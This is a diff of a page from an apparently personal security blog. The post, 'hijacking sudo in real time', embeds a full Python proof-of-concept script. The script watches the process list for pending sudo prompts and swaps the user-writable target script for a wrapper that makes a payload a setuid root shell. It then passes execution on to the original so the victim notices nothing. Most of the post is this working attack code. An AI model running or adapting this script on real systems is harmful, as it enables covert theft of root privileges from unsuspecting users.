@@ -13,7 +13,7 @@
         <div id="menu">
                         <h3>Mark Wadham</h3>
             <ul>
-                <li><a href="/index.html">profile</a></li>
+                <li><a href="/">profile</a></li>
                 <li><a href="/blog.html">blog</a> <a href="/blog/rss"><img src="/img/rss.png" /></a></li>
                 <li><a href="/cves.html">CVEs</a></li>
                 <li><a href="/jsdemos.html">js demos</a></li>
@@ -23,17 +23,18 @@
                 <li class="small">linkedin: <a href="https://uk.linkedin.com/in/mark-wadham-14ab49a6">379069834</a></li>
                 <li class="red space small"></li>
             </ul>
-
         </div>
         <div id="content">
             <div id="main-content">
-                                            <div class="post">
+                            
+                            <div class="post">
                 <h2><a href="/blog/hijacking-sudo-in-real-time.html">hijacking sudo in real time</a></h2>
                 <h3>15 Aug 2018 22:03  | <a class="tag" href="/blog/tag/macOS.html">macOS</a> | <a class="tag" href="/blog/tag/security.html">security</a></h3>
+                
                   <pre>A while ago I posted about how sudo can be easily backdoored by dropping a fake
-sudo script into the user&#39;s PATH:
+sudo script into the user&#x27;s PATH:
 
-<a href="https://m4.rkw.io/blog/getting-root-without-an-exploit--stealth-sudo-backdoor.html">https://m4.rkw.io/blog/getting-root-without-an-exploit--stealth-sudo-backdoor...</a>
+https://m4.rkw.io/blog/getting-root-without-an-exploit--stealth-sudo-backdoor.html
 
 Another attack vector for sudo is monitoring the process list for invocations of
 sudo where the user is being prompted for their sudo password and the target
@@ -43,9 +44,9 @@ something else in order to steal root privileges.
 
 The proof of concept below demonstrates how this can be done, and includes a
 simple shell wrapper that forwards the sudo execution on to a copy of the
-original script so the user likely won&#39;t notice anything.
+original script so the user likely won&#x27;t notice anything.
 
-<a href="https://m4.rkw.io/sudo_steal.py.txt">https://m4.rkw.io/sudo_steal.py.txt</a>
+https://m4.rkw.io/sudo_steal.py.txt
 0d5bb04be60acf3ebb7a7f16932ebd8b8f75636ede85e4e5bcf1f08fbe5e25da
 -------------------------------------------------------------------------------
 #!/usr/bin/env python2.7
@@ -59,7 +60,7 @@ original script so the user likely won&#39;t notice anything.
 #
 # in the time it takes you to enter your sudo password, sudo_steal.py will hijack
 # the target in order to steal a root shell, and then pass the execution chain
-# on to a copy of the script so the user running sudo won&#39;t know anything is amis.
+# on to a copy of the script so the user running sudo won&#x27;t know anything is amis.
 
 import os
 import sys
@@ -70,7 +71,7 @@ import time
 
 def is_writable(path):
   try:
-    with open(path,&#39;a+&#39;) as f:
+    with open(path,&#x27;a+&#x27;) as f:
       pass
     return True
   except:
@@ -90,7 +91,7 @@ def is_writable(path):
 def fast_find_file(filename):
   matches = []
 
-  h = os.environ[&#39;HOME&#39;]
+  h = os.environ[&#x27;HOME&#x27;]
 
   home_path = &quot;%s/%s&quot; % (h, filename)
 
@@ -102,16 +103,16 @@ def fast_find_file(filename):
   for x in os.popen(&quot;ls -a1 %s&quot; % (h)).read().rstrip().split(&quot;\n&quot;):
     if os.path.isdir(&quot;%s/%s&quot; % (h, x)) and not os.path.islink(&quot;%s/%s&quot; % (h, x)):
       if x not in [
-          &#39;.&#39;, &#39;..&#39;,
-          &#39;Library&#39;,
-          &#39;Music&#39;,
-          &#39;Pictures&#39;,
-          &#39;Documents&#39;,
-          &#39;Movies&#39;,
-          &#39;VirtualBox VMs&#39;,
-          &#39;.cups&#39;,
-          &#39;.vagrant.d&#39;,
-          &#39;.ansible&#39;
+          &#x27;.&#x27;, &#x27;..&#x27;,
+          &#x27;Library&#x27;,
+          &#x27;Music&#x27;,
+          &#x27;Pictures&#x27;,
+          &#x27;Documents&#x27;,
+          &#x27;Movies&#x27;,
+          &#x27;VirtualBox VMs&#x27;,
+          &#x27;.cups&#x27;,
+          &#x27;.vagrant.d&#x27;,
+          &#x27;.ansible&#x27;
         ]:
         dirs.append(&quot;%s/%s&quot; % (h, x))
 
@@ -130,10 +131,10 @@ def fast_find_file(filename):
 # generate a temporary filename to move the hijacked script to
 
 def get_target(match):
-  target = match + &#39;x&#39;
+  target = match + &#x27;x&#x27;
 
   while os.path.exists(target):
-    target += &#39;x&#39;
+    target += &#x27;x&#x27;
 
   return target
 
@@ -160,7 +161,7 @@ def exploit(pid, matches):
       # move the target out of the way and drop in a bash redirect script
       # that sets 0:0 and +s on our rootshell payload
       os.rename(match, remap[match])
-      with open(match,&#39;w&#39;) as f:
+      with open(match,&#x27;w&#x27;) as f:
         f.write(&quot;#!/bin/bash\n&quot;)
         f.write(&quot;chown 0:0 /tmp/.,\n&quot;)
         f.write(&quot;chmod 4755 /tmp/.,\n&quot;)
@@ -218,7 +219,7 @@ while True:
   # processes that have children (i.e. already authenticated)
 
   for line in ps_lines:
-    seg = line.split(&#39; &#39;)
+    seg = line.split(&#x27; &#x27;)
     pid = seg[0]
     ppid = seg[1]
 
@@ -231,14 +232,14 @@ while True:
   # and where the target binary/script is user-writable
 
   for line in ps_lines:
-    seg = line.split(&#39; &#39;)
+    seg = line.split(&#x27; &#x27;)
 
-    if seg[2] == &#39;sudo&#39;:
+    if seg[2] == &#x27;sudo&#x27;:
       print &quot;potential target: %s&quot; % (line)
 
       pid = seg[0]
 
-      # if sudo has child processes then it&#39;s already authenticated
+      # if sudo has child processes then it&#x27;s already authenticated
       if pid in children.keys():
         print &quot;%s has children, skipping&quot; % (pid)
         continue
@@ -259,10 +260,11 @@ while True:
       if matches:
         exploit(pid, matches)
 
-  time.sleep(1)</pre>
+  time.sleep(1)
+</pre>
+                
             </div>
-
-
+            
             </div>
             <div id="right-content">
                 
@@ -272,39 +274,67 @@ while True:
 
             <ul>
               <li>&nbsp;&nbsp;[year]</li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2022.html">2022</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2021.html">2021</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2020.html">2020</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2019.html">2019</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2018.html">2018</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2017.html">2017</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2016.html">2016</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2015.html">2015</a></li>
+              
             </ul>
 
             <ul>
               <li>&nbsp;&nbsp;[tag]</li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/AWS.html">AWS</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/agile.html">agile</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/apple.html">apple</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/bash.html">bash</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/cryptocurrency.html">cryptocurrency</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/development.html">development</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/exploits.html">exploits</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/iOS.html">iOS</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/linux.html">linux</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/macOS.html">macOS</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/mining.html">mining</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/mysql.html">mysql</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/php.html">php</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/ruby.html">ruby</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/scrum.html">scrum</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/security.html">security</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/touchID.html">touchID</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/vim.html">vim</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/work.html">work</a></li>
+              
             </ul>
-
             </div>
         </div>
 				<script>
